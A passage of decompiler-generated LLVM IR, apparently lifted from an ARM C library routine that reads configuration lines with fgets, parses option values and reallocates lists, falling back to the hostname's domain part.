  %tmp60 = icmp slt i32 %v4_2ef48, 1
  br i1 %tmp60, label %dec_label_pc_2f130.backedge, label %dec_label_pc_2ef58

dec_label_pc_2ef58:                               ; preds = %dec_label_pc_2ef3c, %dec_label_pc_2ef00
  %v0_2ef5c.off0 = phi i16 [ 10, %dec_label_pc_2ef00 ], [ 2, %dec_label_pc_2ef3c ]
  store i32 %v2_2ef58, i32* %r2.global-to-local, align 4
  store i16 %v0_2ef5c.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 29908, i32* @r7, align 4
  %v0_2ef6c = load i32, i32* @r5, align 4
  %v2_2ef6c = add i32 %v0_2ef6c, 29908
  %v3_2ef6c = inttoptr i32 %v2_2ef6c to i32*
  %v4_2ef6c = load i32, i32* %v3_2ef6c, align 4
  store i32 29904, i32* @sl, align 4
  %v1_2ef74 = add i32 %v4_2ef6c, 1
  store i32 %v1_2ef74, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_2ef7c = mul i32 %v1_2ef74, 28
  store i32 %v2_2ef7c, i32* %r1.global-to-local, align 4
  %v2_2ef80 = add i32 %v0_2ef6c, 29904
  %v3_2ef80 = inttoptr i32 %v2_2ef80 to i32*
  %v4_2ef80 = load i32, i32* %v3_2ef80, align 4
  store i32 %v4_2ef80, i32* %r0.global-to-local, align 4
  %v2_2ef84 = inttoptr i32 %v4_2ef80 to i32*
  %v3_2ef84 = call i32 @realloc(i32* %v2_2ef84, i32 %v2_2ef7c)
  store i32 %v3_2ef84, i32* %r0.global-to-local, align 4
  store i32 %v3_2ef84, i32* @r6, align 4
  %v2_2ef88 = icmp eq i32 %v3_2ef84, 0
  br i1 %v2_2ef88, label %dec_label_pc_2f130.backedge, label %dec_label_pc_2ef90

dec_label_pc_2ef90:                               ; preds = %dec_label_pc_2ef58
  %v0_2ef90 = load i32, i32* @r5, align 4
  %v1_2ef90 = load i32, i32* @r7, align 4
  %v2_2ef90 = add i32 %v1_2ef90, %v0_2ef90
  %v3_2ef90 = inttoptr i32 %v2_2ef90 to i32*
  %v4_2ef90 = load i32, i32* %v3_2ef90, align 4
  store i32 %v4_2ef90, i32* %r4.global-to-local, align 4
  %v1_2ef94 = load i32, i32* @r8, align 4
  %v3_2ef94 = mul i32 %v1_2ef94, %v4_2ef90
  %v4_2ef94 = add i32 %v3_2ef94, %v3_2ef84
  store i32 %v4_2ef94, i32* %lr.global-to-local, align 4
  %v2_2ef9c = load i16, i16* %stack_var_-68, align 2
  %v3_2ef9c = sext i16 %v2_2ef9c to i32
  store i32 %v3_2ef9c, i32* %r0.global-to-local, align 4
  %v6_2ef9c = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_2ef9c, i32* %r1.global-to-local, align 4
  %v9_2ef9c = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_2ef9c, i32* %r2.global-to-local, align 4
  %v2_2efa0 = load i32, i32* @sl, align 4
  %v3_2efa0 = add i32 %v2_2efa0, %v0_2ef90
  %v4_2efa0 = inttoptr i32 %v3_2efa0 to i32*
  store i32 %v3_2ef84, i32* %v4_2efa0, align 4
  %v0_2efa4 = load i32, i32* %lr.global-to-local, align 4
  %v1_2efa4 = inttoptr i32 %v0_2efa4 to i32*
  %v2_2efa4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_2efa4, i32* %v1_2efa4, align 4
  %v3_2efa4 = add i32 %v0_2efa4, 4
  %v4_2efa4 = inttoptr i32 %v3_2efa4 to i32*
  %v5_2efa4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2efa4, i32* %v4_2efa4, align 4
  %v6_2efa4 = add i32 %v0_2efa4, 8
  %v7_2efa4 = inttoptr i32 %v6_2efa4 to i32*
  %v8_2efa4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_2efa4, i32* %v7_2efa4, align 4
  %v9_2efa4 = add i32 %v0_2efa4, 12
  %v10_2efa4 = inttoptr i32 %v9_2efa4 to i32*
  %v11_2efa4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_2efa4, i32* %v10_2efa4, align 4
  %v12_2efa4 = add i32 %v0_2efa4, 16
  store i32 %v12_2efa4, i32* @lr, align 4
  %v2_2efa8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_2efa8, i32* %r0.global-to-local, align 4
  %v0_2efac = load i32, i32* %r4.global-to-local, align 4
  %v1_2efac = add i32 %v0_2efac, 1
  store i32 %v1_2efac, i32* %r4.global-to-local, align 4
  %v1_2efb0 = inttoptr i32 %v12_2efa4 to i32*
  store i32 %v2_2efa8, i32* %v1_2efb0, align 4
  %v3_2efb0 = add i32 %v0_2efa4, 20
  %v4_2efb0 = inttoptr i32 %v3_2efb0 to i32*
  %v5_2efb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2efb0, i32* %v4_2efb0, align 4
  %v6_2efb0 = add i32 %v0_2efa4, 24
  %v7_2efb0 = inttoptr i32 %v6_2efb0 to i32*
  %v8_2efb0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_2efb0, i32* %v7_2efb0, align 4
  %v0_2efb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_2efb4 = load i32, i32* @r5, align 4
  %v2_2efb4 = load i32, i32* @r7, align 4
  %v3_2efb4 = add i32 %v2_2efb4, %v1_2efb4
  %v4_2efb4 = inttoptr i32 %v3_2efb4 to i32*
  store i32 %v0_2efb4, i32* %v4_2efb4, align 4
  br label %dec_label_pc_2f130.backedge

dec_label_pc_2f130.backedge:                      ; preds = %dec_label_pc_2f058, %dec_label_pc_2f048, %dec_label_pc_2f014, %dec_label_pc_2ef90, %dec_label_pc_2f0e8, %dec_label_pc_2ef3c, %dec_label_pc_2ef58, %dec_label_pc_2f090, %dec_label_pc_2f098, %dec_label_pc_2f07c, %dec_label_pc_2f0cc
  %v0_2f13c.pre = load i32, i32* @fp, align 4
  store i32 %v2_2f130, i32* @r4, align 4
  store i32 %v2_2f130, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_2f13c.pre, i32* %r2.global-to-local, align 4
  %v3_2f140 = call i32 @fgets(i32 %v2_2f130, i32 128, i32 %v0_2f13c.pre)
  store i32 %v3_2f140, i32* %r0.global-to-local, align 4
  %v2_2f144 = icmp eq i32 %v3_2f140, 0
  br i1 %v2_2f144, label %dec_label_pc_2f14c, label %dec_label_pc_2eed4

dec_label_pc_2efbc:                               ; preds = %dec_label_pc_2eed4
  %v0_2efbc = load i32, i32* @r4, align 4
  store i32 %v0_2efbc, i32* %r0.global-to-local, align 4
  store i32 %v2_2f10c, i32* @r1, align 4
  %v2_2efc4 = inttoptr i32 %v0_2efbc to i8*
  %v3_2efc4 = call i32 @__GI_strcoll(i8* %v2_2efc4, i32 %v2_2f10c)
  store i32 %v3_2efc4, i32* %r0.global-to-local, align 4
  %v2_2efc8 = icmp eq i32 %v3_2efc4, 0
  br i1 %v2_2efc8, label %dec_label_pc_2effc, label %dec_label_pc_2efd0

dec_label_pc_2efd0:                               ; preds = %dec_label_pc_2efbc
  %v0_2efd0 = load i32, i32* @r4, align 4
  store i32 %v0_2efd0, i32* %r0.global-to-local, align 4
  store i32 %v2_2f118, i32* @r1, align 4
  %v2_2efd8 = inttoptr i32 %v0_2efd0 to i8*
  %v3_2efd8 = call i32 @__GI_strcoll(i8* %v2_2efd8, i32 %v2_2f118)
  store i32 %v3_2efd8, i32* %r0.global-to-local, align 4
  %v2_2efdc = icmp eq i32 %v3_2efd8, 0
  br i1 %v2_2efdc, label %dec_label_pc_2effc, label %dec_label_pc_2f07c

dec_label_pc_2efe8:                               ; preds = %dec_label_pc_2effc, %dec_label_pc_2efe8.dec_label_pc_2efe8_crit_edge
  %v2_2efec = phi i32 [ %v1_2f000, %dec_label_pc_2efe8.dec_label_pc_2efe8_crit_edge ], [ %v1_2f00010, %dec_label_pc_2effc ]
  %v0_2efec = phi i32 [ %v1_2f008, %dec_label_pc_2efe8.dec_label_pc_2efe8_crit_edge ], [ %v1_2f00817, %dec_label_pc_2effc ]
  %v1_2efe8 = phi i32 [ %v1_2efe8.pre, %dec_label_pc_2efe8.dec_label_pc_2efe8_crit_edge ], [ 29900, %dec_label_pc_2effc ]
  %v1_2efec = phi i32 [ %v0_2f000, %dec_label_pc_2efe8.dec_label_pc_2efe8_crit_edge ], [ %v0_2f0009, %dec_label_pc_2effc ]
  %v2_2efe8 = add i32 %v1_2efec, %v1_2efe8
  %v3_2efe8 = inttoptr i32 %v2_2efe8 to i32*
  %v4_2efe8 = load i32, i32* %v3_2efe8, align 4
  store i32 %v4_2efe8, i32* %r3.global-to-local, align 4
  %v3_2efec = add i32 %v1_2efec, %v2_2efec
  %v4_2efec = inttoptr i32 %v3_2efec to i32*
  store i32 %v0_2efec, i32* %v4_2efec, align 4
  %v0_2eff0 = load i32, i32* %r3.global-to-local, align 4
  %v1_2eff0 = load i32, i32* %r2.global-to-local, align 4
  %v4_2eff0 = mul i32 %v1_2eff0, 4
  %v5_2eff0 = add i32 %v4_2eff0, %v0_2eff0
  %v6_2eff0 = inttoptr i32 %v5_2eff0 to i32*
  %v7_2eff0 = load i32, i32* %v6_2eff0, align 4
  store i32 %v7_2eff0, i32* @r0, align 4
  %v0_2eff4 = call i32 @free()
  store i32 %v0_2eff4, i32* %r0.global-to-local, align 4
  %v0_2f000 = load i32, i32* @r5, align 4
  %v1_2f000 = load i32, i32* @sb, align 4
  %v2_2f000 = add i32 %v1_2f000, %v0_2f000
  %v3_2f000 = inttoptr i32 %v2_2f000 to i32*
  %v4_2f000 = load i32, i32* %v3_2f000, align 4
  store i32 %v4_2f000, i32* %r3.global-to-local, align 4
  %v2_2f004 = icmp eq i32 %v4_2f000, 0
  %v1_2f008 = add i32 %v4_2f000, -1
  store i32 %v1_2f008, i32* %r2.global-to-local, align 4
  br i1 %v2_2f004, label %dec_label_pc_2f010, label %dec_label_pc_2efe8.dec_label_pc_2efe8_crit_edge

dec_label_pc_2efe8.dec_label_pc_2efe8_crit_edge:  ; preds = %dec_label_pc_2efe8
  %v1_2efe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2efe8

dec_label_pc_2effc:                               ; preds = %dec_label_pc_2efd0, %dec_label_pc_2efbc
  store i32 29900, i32* @r4, align 4
  %v0_2f0009 = load i32, i32* @r5, align 4
  %v1_2f00010 = load i32, i32* @sb, align 4
  %v2_2f00011 = add i32 %v1_2f00010, %v0_2f0009
  %v3_2f00012 = inttoptr i32 %v2_2f00011 to i32*
  %v4_2f00013 = load i32, i32* %v3_2f00012, align 4
  store i32 %v4_2f00013, i32* %r3.global-to-local, align 4
  %v2_2f00415 = icmp eq i32 %v4_2f00013, 0
  %v1_2f00817 = add i32 %v4_2f00013, -1
  store i32 %v1_2f00817, i32* %r2.global-to-local, align 4
  br i1 %v2_2f00415, label %dec_label_pc_2f010, label %dec_label_pc_2efe8

dec_label_pc_2f010:                               ; preds = %dec_label_pc_2efe8, %dec_label_pc_2effc
  store i32 29900, i32* @r6, align 4
  br label %dec_label_pc_2f014

dec_label_pc_2f014:                               ; preds = %dec_label_pc_2f058, %dec_label_pc_2f010
  %v0_2f014 = load i32, i32* @r7, align 4
  store i32 %v0_2f014, i32* %r0.global-to-local, align 4
  %v0_2f018 = call i32 @skip_nospace()
  store i32 %v0_2f018, i32* %r0.global-to-local, align 4
  %v1_2f01c = inttoptr i32 %v0_2f018 to i8*
  %v2_2f01c = call i32 @skip_and_NUL_space(i8* %v1_2f01c)
  store i32 %v2_2f01c, i32* %r0.global-to-local, align 4
  %v0_2f020 = load i32, i32* @r5, align 4
  %v1_2f020 = load i32, i32* @sb, align 4
  %v2_2f020 = add i32 %v1_2f020, %v0_2f020
  %v3_2f020 = inttoptr i32 %v2_2f020 to i32*
  %v4_2f020 = load i32, i32* %v3_2f020, align 4
  store i32 %v2_2f01c, i32* @r4, align 4
  %tmp69 = mul i32 %v4_2f020, 4
  %v3_2f02c = add i32 %tmp69, 4
  store i32 %v3_2f02c, i32* %r1.global-to-local, align 4
  %v1_2f030 = load i32, i32* @r6, align 4
  %v2_2f030 = add i32 %v1_2f030, %v0_2f020
  %v3_2f030 = inttoptr i32 %v2_2f030 to i32*
  %v4_2f030 = load i32, i32* %v3_2f030, align 4
  store i32 %v4_2f030, i32* %r0.global-to-local, align 4
  %v2_2f034 = inttoptr i32 %v4_2f030 to i32*
  %v3_2f034 = call i32 @realloc(i32* %v2_2f034, i32 %v3_2f02c)
  store i32 %v3_2f034, i32* %r3.global-to-local, align 4
  %v2_2f038 = icmp eq i32 %v3_2f034, 0
  %v0_2f03c = load i32, i32* @r7, align 4
  store i32 %v0_2f03c, i32* %r0.global-to-local, align 4
  %v0_2f040 = load i32, i32* @r4, align 4
  store i32 %v0_2f040, i32* @r7, align 4
  br i1 %v2_2f038, label %dec_label_pc_2f130.backedge, label %dec_label_pc_2f048

dec_label_pc_2f048:                               ; preds = %dec_label_pc_2f014
  %v1_2f048 = load i32, i32* @r5, align 4
  %v2_2f048 = load i32, i32* @r6, align 4
  %v3_2f048 = add i32 %v2_2f048, %v1_2f048
  %v4_2f048 = inttoptr i32 %v3_2f048 to i32*
  store i32 %v3_2f034, i32* %v4_2f048, align 4
  %v1_2f04c = inttoptr i32 %v0_2f03c to i8*
  %v2_2f04c = call i32 @__GI_strdup(i8* %v1_2f04c)
  store i32 %v2_2f04c, i32* %r0.global-to-local, align 4
  %v2_2f050 = icmp eq i32 %v2_2f04c, 0
  br i1 %v2_2f050, label %dec_label_pc_2f130.backedge, label %dec_label_pc_2f058

dec_label_pc_2f058:                               ; preds = %dec_label_pc_2f048
  %v0_2f058 = load i32, i32* @r5, align 4
  %v1_2f058 = load i32, i32* @sb, align 4
  %v2_2f058 = add i32 %v1_2f058, %v0_2f058
  %v3_2f058 = inttoptr i32 %v2_2f058 to i32*
  %v4_2f058 = load i32, i32* %v3_2f058, align 4
  store i32 %v4_2f058, i32* %r3.global-to-local, align 4
  %v1_2f05c = load i32, i32* @r6, align 4
  %v2_2f05c = add i32 %v1_2f05c, %v0_2f058
  %v3_2f05c = inttoptr i32 %v2_2f05c to i32*
  %v4_2f05c = load i32, i32* %v3_2f05c, align 4
  store i32 %v4_2f05c, i32* %r2.global-to-local, align 4
  %v1_2f060 = add i32 %v4_2f058, 1
  store i32 %v1_2f060, i32* %r1.global-to-local, align 4
  %v5_2f064 = mul i32 %v4_2f058, 4
  %v6_2f064 = add i32 %v4_2f05c, %v5_2f064
  %v7_2f064 = inttoptr i32 %v6_2f064 to i32*
  store i32 %v2_2f04c, i32* %v7_2f064, align 4
  %v0_2f068 = load i32, i32* %r1.global-to-local, align 4
  %v1_2f068 = load i32, i32* @r5, align 4
  %v2_2f068 = load i32, i32* @sb, align 4
  %v3_2f068 = add i32 %v2_2f068, %v1_2f068
  %v4_2f068 = inttoptr i32 %v3_2f068 to i32*
  store i32 %v0_2f068, i32* %v4_2f068, align 4
  %v0_2f06c = load i32, i32* @r4, align 4
  %v1_2f06c = inttoptr i32 %v0_2f06c to i8*
  %v2_2f06c = load i8, i8* %v1_2f06c, align 1
  %v3_2f06c = zext i8 %v2_2f06c to i32
  store i32 %v3_2f06c, i32* %r3.global-to-local, align 4
  %v2_2f070 = icmp eq i8 %v2_2f06c, 0
  br i1 %v2_2f070, label %dec_label_pc_2f130.backedge, label %dec_label_pc_2f014

dec_label_pc_2f07c:                               ; preds = %dec_label_pc_2efd0
  %v0_2f07c = load i32, i32* @r4, align 4
  store i32 %v0_2f07c, i32* %r0.global-to-local, align 4
  %v2_2f080 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_2f080, i32* @r1, align 4
  %v2_2f084 = inttoptr i32 %v0_2f07c to i8*
  %v3_2f084 = call i32 @__GI_strcoll(i8* %v2_2f084, i32 %v2_2f080)
  store i32 %v3_2f084, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_2f084, 16777216
  %v1_2f088 = sdiv i32 %sext2, 16777216
  store i32 %v1_2f088, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_2f090, label %dec_label_pc_2f130.backedge

dec_label_pc_2f090:                               ; preds = %dec_label_pc_2f07c
  %v0_2f090 = load i32, i32* @r7, align 4
  %v2_2f090 = icmp eq i32 %v0_2f090, 0
  br i1 %v2_2f090, label %dec_label_pc_2f130.backedge, label %dec_label_pc_2f098

dec_label_pc_2f098:                               ; preds = %dec_label_pc_2f090
  store i32 %v0_2f090, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_2f0a0 = call i32 @__GI_strchr(i32 %v0_2f090, i32 58)
  store i32 %v2_2f0a0, i32* %r0.global-to-local, align 4
  store i32 %v2_2f0a0, i32* @r6, align 4
  %v3_2f0a4 = icmp eq i32 %v2_2f0a0, 0
  br i1 %v3_2f0a4, label %dec_label_pc_2f130.backedge, label %dec_label_pc_2f0ac

dec_label_pc_2f0ac:                               ; preds = %dec_label_pc_2f098
  store i32 -33168, i32* %r1.global-to-local, align 4
  %v0_2f0b0 = load i32, i32* @r4, align 4
  %v1_2f0b0 = trunc i32 %v0_2f0b0 to i8
  %v3_2f0b0 = inttoptr i32 %v2_2f0a0 to i8*
  store i8 %v1_2f0b0, i8* %v3_2f0b0, align 1
  %v0_2f0b4 = load i32, i32* @r5, align 4
  %v1_2f0b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_2f0b4 = add i32 %v1_2f0b4, %v0_2f0b4
  store i32 %v2_2f0b4, i32* @r1, align 4
  %v0_2f0b8 = load i32, i32* @r7, align 4
  store i32 %v0_2f0b8, i32* %r0.global-to-local, align 4
  %v2_2f0bc = inttoptr i32 %v0_2f0b8 to i8*
  %v3_2f0bc = call i32 @__GI_strcoll(i8* %v2_2f0bc, i32 %v2_2f0b4)
  store i32 %v3_2f0bc, i32* %r0.global-to-local, align 4
  %v2_2f0c0 = icmp eq i32 %v3_2f0bc, 0
  br i1 %v2_2f0c0, label %dec_label_pc_2f0e8, label %dec_label_pc_2f0cc

dec_label_pc_2f0cc:                               ; preds = %dec_label_pc_2f0ac
  %v0_2f0d0 = load i32, i32* @r7, align 4
  store i32 %v0_2f0d0, i32* %r0.global-to-local, align 4
  %v0_2f0d4 = load i32, i32* @r5, align 4
  %v2_2f0d4 = add i32 %v0_2f0d4, -33160
  store i32 %v2_2f0d4, i32* @r1, align 4
  %v2_2f0d8 = inttoptr i32 %v0_2f0d0 to i8*
  %v3_2f0d8 = call i32 @__GI_strcoll(i8* %v2_2f0d8, i32 %v2_2f0d4)
  store i32 %v3_2f0d8, i32* %r0.global-to-local, align 4
  %v2_2f0dc = icmp eq i32 %v3_2f0d8, 0
  br i1 %v2_2f0dc, label %dec_label_pc_2f0e8, label %dec_label_pc_2f130.backedge

dec_label_pc_2f0e8:                               ; preds = %dec_label_pc_2f0cc, %dec_label_pc_2f0ac
  %storemerge = phi i32 [ 878, %dec_label_pc_2f0ac ], [ 879, %dec_label_pc_2f0cc ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_2f0e8 = load i32, i32* @r6, align 4
  %v1_2f0e8 = add i32 %v0_2f0e8, 1
  store i32 %v1_2f0e8, i32* @r0, align 4
  %v0_2f0ec = load i32, i32* @r5, align 4
  %v2_2f0ec = add i32 %v0_2f0ec, %storemerge
  store i32 %v2_2f0ec, i32* @r4, align 4
  %v1_2f0f0 = call i32 @atol(i32 %v1_2f0e8)
  %v2_2f0f0 = trunc i32 %v1_2f0f0 to i8
  store i32 %v1_2f0f0, i32* %r0.global-to-local, align 4
  %v3_2f0f4 = load i32, i32* @r4, align 4
  %v4_2f0f4 = inttoptr i32 %v3_2f0f4 to i8*
  store i8 %v2_2f0f0, i8* %v4_2f0f4, align 1
  br label %dec_label_pc_2f130.backedge

dec_label_pc_2f0fc:                               ; preds = %dec_label_pc_2ee9c
  %v0_2f100 = load i32, i32* @r5, align 4
  %v2_2f100 = add i32 %v0_2f100, -33204
  %v2_2f10c = add i32 %v0_2f100, -33192
  %v2_2f118 = add i32 %v0_2f100, -33184
  %v2_2f124 = add i32 %v0_2f100, -33176
  store i32 %v2_2f124, i32* %r3.global-to-local, align 4
  store i32 29912, i32* @sb, align 4
  store i32 %v2_2f124, i32* %stack_var_-560, align 4
  %v2_2f130 = ptrtoint i32* %stack_var_-288 to i32
  %v1_2eed8 = bitcast i32* %stack_var_-288 to i8*
  %v2_2ef08 = ptrtoint i16* %stack_var_-68 to i32
  %v3_2ef1c = bitcast i16* %stack_var_-68 to i8*
  %v2_2ef28 = ptrtoint i32* %stack_var_-60 to i32
  %v2_2ef40 = ptrtoint i32* %stack_var_-64 to i32
  %v2_2ef58 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_2f130, i32* @r4, align 4
  store i32 %v2_2f130, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v5_2eec4, i32* %r2.global-to-local, align 4
  %v3_2f14066 = call i32 @fgets(i32 %v2_2f130, i32 128, i32 %v5_2eec4)
  store i32 %v3_2f14066, i32* %r0.global-to-local, align 4
  %v2_2f14468 = icmp eq i32 %v3_2f14066, 0
  br i1 %v2_2f14468, label %dec_label_pc_2f14c, label %dec_label_pc_2eed4

dec_label_pc_2f14c:                               ; preds = %dec_label_pc_2f130.backedge, %dec_label_pc_2f0fc
  %v0_2f14c = load i32, i32* @fp, align 4
  store i32 %v0_2f14c, i32* %r0.global-to-local, align 4
  %v1_2f150 = inttoptr i32 %v0_2f14c to i16*
  %v2_2f150 = call i32 @__GI_fclose(i16* %v1_2f150)
  store i32 %v2_2f150, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2f154

dec_label_pc_2f154:                               ; preds = %dec_label_pc_2ee9c, %dec_label_pc_2f14c
  store i32 29908, i32* %r3.global-to-local, align 4
  %v0_2f158 = load i32, i32* @r5, align 4
  %v2_2f158 = add i32 %v0_2f158, 29908
  %v3_2f158 = inttoptr i32 %v2_2f158 to i32*
  %v4_2f158 = load i32, i32* %v3_2f158, align 4
  store i32 %v4_2f158, i32* %r3.global-to-local, align 4
  %v2_2f15c = icmp eq i32 %v4_2f158, 0
  br i1 %v2_2f15c, label %dec_label_pc_2f164, label %dec_label_pc_2f1a0

dec_label_pc_2f164:                               ; preds = %dec_label_pc_2f154
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_2f168 = call i32 @malloc(i32 28)
  store i32 %v1_2f168, i32* %r0.global-to-local, align 4
  store i32 -33148, i32* %r3.global-to-local, align 4
  store i32 29904, i32* %r2.global-to-local, align 4
  %v2_2f174 = icmp eq i32 %v1_2f168, 0
  %v1_2f178 = load i32, i32* @r5, align 4
  br i1 %v2_2f174, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_2f164
  %v3_2f178 = add i32 %v1_2f178, -33148
  store i32 %v3_2f178, i32* %r3.global-to-local, align 4
  %v3_2f17c28 = add i32 %v1_2f178, 29904
  %v4_2f17c29 = inttoptr i32 %v3_2f17c28 to i32*
  store i32 0, i32* %v4_2f17c29, align 4
  %v1_2f180 = load i32, i32* %r3.global-to-local, align 4
  %v2_2f180 = load i32, i32* @r5, align 4
  %v3_2f180 = load i32, i32* %r2.global-to-local, align 4
  %v4_2f180 = add i32 %v3_2f180, %v2_2f180
  %v5_2f180 = inttoptr i32 %v4_2f180 to i32*
  store i32 %v1_2f180, i32* %v5_2f180, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_2f164
  %v3_2f17c = add i32 %v1_2f178, 29904
  %v4_2f17c = inttoptr i32 %v3_2f17c to i32*
  store i32 %v1_2f168, i32* %v4_2f17c, align 4
  %v1_2f184 = load i32, i32* @r5, align 4
  %v2_2f184 = load i32, i32* %r3.global-to-local, align 4
  %v3_2f184 = add i32 %v2_2f184, %v1_2f184
  store i32 %v3_2f184, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 192912, i32* @lr, align 4
  %v1_2f18c = xor i1 %v2_2f174, true
  call void @__pseudo_cond_branch(i1 %v1_2f18c, i32 ptrtoint (i32* @global_var_24950.3330 to i32))
  store i32 29908, i32* %r2.global-to-local, align 4
  %v0_2f194 = load i32, i32* @r5, align 4
  %v2_2f194 = add i32 %v0_2f194, 29908
  %v3_2f194 = inttoptr i32 %v2_2f194 to i32*
  %v4_2f194 = load i32, i32* %v3_2f194, align 4
  %v1_2f198 = add i32 %v4_2f194, 1
  store i32 %v1_2f198, i32* %r3.global-to-local, align 4
  store i32 %v1_2f198, i32* %v3_2f194, align 4
  %v0_2f1a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2f1a0

dec_label_pc_2f1a0:                               ; preds = %dec_label_pc_2f154, %.thread4
  %v0_2f1a4 = phi i32 [ %v0_2f158, %dec_label_pc_2f154 ], [ %v0_2f1a4.pre, %.thread4 ]
  store i32 29912, i32* @r7, align 4
  %v2_2f1a4 = add i32 %v0_2f1a4, 29912
  %v3_2f1a4 = inttoptr i32 %v2_2f1a4 to i32*
  %v4_2f1a4 = load i32, i32* %v3_2f1a4, align 4
  store i32 %v4_2f1a4, i32* @r4, align 4
  %v2_2f1a8 = icmp eq i32 %v4_2f1a4, 0
  br i1 %v2_2f1a8, label %dec_label_pc_2f1b0, label %dec_label_pc_2f230

dec_label_pc_2f1b0:                               ; preds = %dec_label_pc_2f1a0
  %v2_2f1b0 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_2f1b0, i32* @r6, align 4
  store i32 %v2_2f1b0, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_2f1bc = call i32 @__GI_gethostname(i32 %v2_2f1b0, i32 255)
  store i32 %v2_2f1bc, i32* %r0.global-to-local, align 4
  %v2_2f1c0 = icmp eq i32 %v2_2f1bc, 0
  br i1 %v2_2f1c0, label %dec_label_pc_2f1cc, label %dec_label_pc_2f230

dec_label_pc_2f1cc:                               ; preds = %dec_label_pc_2f1b0
  store i32 %v2_2f1b0, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_2f1d4 = call i32 @__GI_strchr(i32 %v2_2f1b0, i32 46)
  store i32 %v2_2f1d4, i32* %r0.global-to-local, align 4
  %v2_2f1d8 = icmp eq i32 %v2_2f1d4, 0
  br i1 %v2_2f1d8, label %dec_label_pc_2f230, label %dec_label_pc_2f1e0

dec_label_pc_2f1e0:                               ; preds = %dec_label_pc_2f1cc
  %v1_2f1e0 = add i32 %v2_2f1d4, 1
  %v2_2f1e0 = inttoptr i32 %v1_2f1e0 to i8*
  %v3_2f1e0 = load i8, i8* %v2_2f1e0, align 1
  %v4_2f1e0 = zext i8 %v3_2f1e0 to i32
  store i32 %v4_2f1e0, i32* %r3.global-to-local, align 4
  %v2_2f1e4 = icmp eq i8 %v3_2f1e0, 0
  store i32 %v1_2f1e0, i32* %r0.global-to-local, align 4
  br i1 %v2_2f1e4, label %dec_label_pc_2f230, label %dec_label_pc_2f1f0

dec_label_pc_2f1f0:                               ; preds = %dec_label_pc_2f1e0
  %v2_2f1f0 = call i32 @__GI_strdup(i8* %v2_2f1e0)
  store i32 %v2_2f1f0, i32* %r0.global-to-local, align 4
  store i32 %v2_2f1f0, i32* @r4, align 4
  %v2_2f1f4 = icmp eq i32 %v2_2f1f0, 0
  br i1 %v2_2f1f4, label %dec_label_pc_2f230, label %dec_label_pc_2f1fc

dec_label_pc_2f1fc:                               ; preds = %dec_label_pc_2f1f0
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_2f200 = call i32 @malloc(i32 4)
  store i32 %v1_2f200, i32* %r0.global-to-local, align 4
  store i32 29900, i32* %r3.global-to-local, align 4
  %v2_2f208 = icmp eq i32 %v1_2f200, 0
  %v1_2f20c = load i32, i32* @r5, align 4
  %v3_2f20c = add i32 %v1_2f20c, 29900
  %v4_2f20c = inttoptr i32 %v3_2f20c to i32*
  store i32 %v1_2f200, i32* %v4_2f20c, align 4
  br i1 %v2_2f208, label %dec_label_pc_2f214, label %dec_label_pc_2f220

dec_label_pc_2f214:                               ; preds = %dec_label_pc_2f1fc
  %v0_2f214 = load i32, i32* @r4, align 4
  store i32 %v0_2f214, i32* @r0, align 4
  %v0_2f218 = call i32 @free()
  store i32 %v0_2f218, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2f230

dec_label_pc_2f220:                               ; preds = %dec_label_pc_2f1fc
  %v0_2f220 = load i32, i32* @r5, align 4
  %v1_2f220 = load i32, i32* @r7, align 4
  %v2_2f220 = add i32 %v1_2f220, %v0_2f220
  %v3_2f220 = inttoptr i32 %v2_2f220 to i32*
  %v4_2f220 = load i32, i32* %v3_2f220, align 4
  %v1_2f224 = add i32 %v4_2f220, 1
  store i32 %v1_2f224, i32* %r3.global-to-local, align 4
  %v0_2f228 = load i32, i32* @r4, align 4
  %v2_2f228 = inttoptr i32 %v1_2f200 to i32*
  store i32 %v0_2f228, i32* %v2_2f228, align 4
  %v0_2f22c = load i32, i32* %r3.global-to-local, align 4
  %v1_2f22c = load i32, i32* @r5, align 4
  %v2_2f22c = load i32, i32* @r7, align 4
  %v3_2f22c = add i32 %v2_2f22c, %v1_2f22c
  %v4_2f22c = inttoptr i32 %v3_2f22c to i32*
  store i32 %v0_2f22c, i32* %v4_2f22c, align 4
  br label %dec_label_pc_2f230

